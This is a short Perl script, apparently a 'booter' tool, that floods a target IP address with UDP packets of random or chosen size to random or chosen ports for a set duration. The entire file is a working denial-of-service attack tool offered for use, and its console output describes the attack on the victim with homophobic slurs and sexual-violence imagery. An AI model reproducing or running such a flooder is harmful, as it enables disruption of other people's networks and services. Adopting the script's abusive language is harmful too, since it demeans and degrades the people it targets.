#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
 

##
# Ran By Ninja AKA Mr. Psychotik-Booter
##

use Socket;
use strict;
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
print BOLD BLUE<<EOTEXT;
█   █▄ █ █ █▄ █   █ ▄▀▄   █ ▄▀ █ ▄▀▀▄ █▄▀
█   █ ▀█ █ █ ▀█ ▄ █ █▀█   █▀▄  █ █  ▄ █▀▄ 
▀   ▀  ▀ ▀ ▀  ▀  ▀  ▀ ▀   ▀  ▀ ▀  ▀▀  ▀  ▀
             █ █ ▄▀▀▄ █  █
              █  █  █ █  █
              ▀   ▀▀   ▀▀
EOTEXT

print BOLD RED<<EOTEXT;
Coded By Psychotik-Booter
EOTEXT

print GREEN "Ninja Raping This Queer Ass $ip " . ($port ? $port : "random") . "
Penetrated by " .
  ($size ? "$size Shurikens" : "Error..") . "
Their Asshole is Now 6-Inches Wider" .
  ($time ? " for $time seconds" : "") . "\n";

print BOLD WHITE<<EOTEXT;
"STOP THE BRUTAL RAPING! with CTRL-C" unless it has been $time seconds;
EOTEXT

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
  